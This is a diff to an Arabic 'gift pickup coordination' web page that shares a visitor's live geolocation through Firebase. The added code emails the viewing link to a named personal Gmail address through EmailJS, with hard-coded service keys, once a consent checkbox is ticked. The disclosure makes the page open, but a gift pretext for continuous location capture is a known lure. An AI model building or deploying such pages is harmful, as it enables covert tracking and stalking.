@@ -22,7 +22,8 @@
 <main>
   <header class="brand"><div class="logo">🎁</div><div><h1>تنسيق استلام هديتك</h1><small>خطوات واضحة وآمنة لاستلام الهدية</small></div></header>
   <section class="panel">
-    <div class="notice"><strong>🎁 أهلاً بك!</strong><br>يمكنك استخدام هذه الصفحة لتنسيق استلام هدية. إذا كان التوصيل إلى عنوانك مطلوباً، يمكنك مشاركة موقعك اختيارياً لتحديد مكان التسليم.<br><strong>خصوصيتك مهمة:</strong> عند الضغط على «مشاركة موقعي لتحديد مكان التسليم» سيطلب المتصفح إذن الوصول إلى موقع جهازك، وسيظهر موقعك لمن يملك رابط المشاهدة. لا تشارك موقعك إلا إذا كنت تعرف الجهة المستلمة وتثق بها. مشاركة الموقع ليست إثباتاً لاستحقاق جائزة، ويمكنك إيقافها في أي وقت.</div>
+    <div class="notice"><strong>🎁 أهلاً بك!</strong><br>يمكنك استخدام هذه الصفحة لتنسيق استلام هدية. إذا كان التوصيل إلى عنوانك مطلوباً، يمكنك مشاركة موقعك اختيارياً لتحديد مكان التسليم.<br><strong>خصوصيتك مهمة:</strong> عند الضغط على «مشاركة موقعي لتحديد مكان التسليم» سيطلب المتصفح إذن الوصول إلى موقع جهازك، وسيظهر موقعك لمن يملك رابط المشاهدة. لا تشارك موقعك إلا إذا كنت تعرف الجهة المستلمة وتثق بها. سيظهر موقعك لمن يملك رابط المشاهدة، وسيُرسل رابط المشاهدة إلى البريد الإلكتروني pesomohammed1@gmail.com عند بدء المشاركة. لا تشارك موقعك إلا إذا كنت توافق على إرسال الرابط إلى هذا البريد. مشاركة الموقع ليست إثباتاً لاستحقاق جائزة، ويمكنك إيقافها في أي وقت.</div>
+    <label class="small" style="display:flex;gap:9px;align-items:flex-start;margin:14px 0"><input id="emailConsent" type="checkbox" style="width:auto;margin:3px 0 0">أوافق على مشاركة موقعي وإرسال رابط مشاهدته إلى pesomohammed1@gmail.com.</label>
     <div id="modeLabel" class="status">وضع الصفحة: مشاركة موقع هذا الجهاز</div>
     <div id="shareControls">
       <div class="actions">
@@ -46,6 +47,7 @@
   <p class="foot">لا تستخدم هذه الصفحة لتحديد موقع أي شخص دون علمه وموافقته.</p>
 </main>
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 <script type="module">
   // إعدادات تطبيق Firebase Web. أضف databaseURL بعد إنشاء Realtime Database.
   // لا تضع مفاتيح خدمة إدارية أو كلمات مرور في هذا الملف.
@@ -61,7 +63,7 @@
 
   const map = L.map('map').setView([30.0444,31.2357],6);
   L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{attribution:'© OpenStreetMap contributors'}).addTo(map);
-  let marker=null,watchId=null,db=null,roomRef=null,unsubscribe=null;
+  let marker=null,watchId=null,db=null,roomRef=null,unsubscribe=null,emailSent=false;
   const $=id=>document.getElementById(id);
   const params=new URLSearchParams(location.search);
   const room=params.get('room');
@@ -114,6 +116,7 @@
   }
 
   $('startBtn').addEventListener('click',async()=>{
+    if(!$('emailConsent').checked){setStatus('shareStatus','يرجى تأكيد موافقتك على مشاركة الموقع وإرسال رابط المشاهدة إلى البريد الموضح قبل المتابعة.');return;}
     if(!navigator.geolocation){setStatus('shareStatus','متصفحك لا يدعم تحديد الموقع.');return;}
     if(watchId!==null)return;
     try{
@@ -127,7 +130,7 @@
       setStatus('shareStatus','تم تجهيز رابط المشاركة. في انتظار إذن الموقع...',true);
       watchId=navigator.geolocation.watchPosition(async pos=>{
         const data={lat:pos.coords.latitude,lng:pos.coords.longitude,accuracy:pos.coords.accuracy,updatedAt:Date.now(),active:true};
-        try{await f.database.set(roomRef,data);showPoint(data.lat,data.lng,'موقعك الحالي');setStatus('shareStatus','موقعك يُشارك الآن. استخدم زر الإيقاف لإنهاء المشاركة.',true);}
+        try{await f.database.set(roomRef,data);showPoint(data.lat,data.lng,'موقعك الحالي');setStatus('shareStatus','موقعك يُشارك الآن. استخدم زر الإيقاف لإنهاء المشاركة.',true);if(!emailSent){emailSent=true;try{await emailjs.send('service_5ci4vcq','template_ttechpb',{location_link:$('shareLink').value,start_time:new Date(data.updatedAt).toLocaleString('ar-EG')},{publicKey:'zdsXpJ6teuY23xJ1E'});setStatus('shareStatus','بدأت مشاركة موقعك، وتم إرسال رابط المشاهدة إلى البريد الموضح.',true);}catch(mailError){emailSent=false;setStatus('shareStatus','موقعك يُشارك الآن، لكن تعذر إرسال إشعار البريد. تحقق من إعدادات EmailJS والقالب.');}}}
         catch(e){setStatus('shareStatus','تعذر إرسال الموقع: '+e.message);}
       },err=>{
         setStatus('shareStatus','لم نتمكن من تحديد الموقع: '+err.message);
